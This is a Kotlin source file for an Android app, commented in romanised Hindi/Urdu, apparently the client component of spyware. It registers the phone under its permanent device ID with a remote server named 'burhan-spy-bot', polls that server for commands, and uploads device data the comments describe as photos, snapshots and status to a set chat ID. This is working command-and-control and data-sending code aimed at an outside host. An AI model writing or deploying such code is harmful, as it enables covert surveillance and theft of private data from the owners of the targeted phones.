package com.burhan.darknet.utils

import android.content.Context
import android.provider.Settings
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class BotIntegration(private val context: Context) {
    private val client = OkHttpClient()
    private val serverUrl = "https://burhan-spy-bot.up.railway.app" // YAHAN APNA URL DAALO

    // PERMANENT DEVICE ID (ANDROID_ID - change nahi hoti)
    private val deviceId: String = Settings.Secure.getString(
        context.contentResolver,
        Settings.Secure.ANDROID_ID
    ) ?: "Unknown"

    // Device register karo (online status)
    suspend fun registerDevice(deviceName: String = "Android Device"): String = withContext(Dispatchers.IO) {
        try {
            val json = JSONObject()
            json.put("deviceId", deviceId)
            json.put("deviceName", deviceName)
            json.put("status", "online")

            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("$serverUrl/api/register-device")
                .post(body)
                .build()
            client.newCall(request).execute().use { response ->
                response.body?.string() ?: "No response"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // App ko commands milti hain
    suspend fun getCommands(): String = withContext(Dispatchers.IO) {
        try {
            val request = Request.Builder()
                .url("$serverUrl/api/commands")
                .build()
            client.newCall(request).execute().use { response ->
                response.body?.string() ?: "No commands"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // App data bhejo (photo, snapshot, status)
    suspend fun sendDeviceData(type: String, data: String): String = withContext(Dispatchers.IO) {
        try {
            val json = JSONObject()
            json.put("type", type)
            json.put("data", data)
            json.put("chatId", 2062068620) // YAHAN TERI USER ID DAALO
            json.put("deviceId", deviceId) // Device ID bhejna

            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("$serverUrl/api/device-data")
                .post(body)
                .build()
            client.newCall(request).execute().use { response ->
                response.body?.string() ?: "No response"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }
}
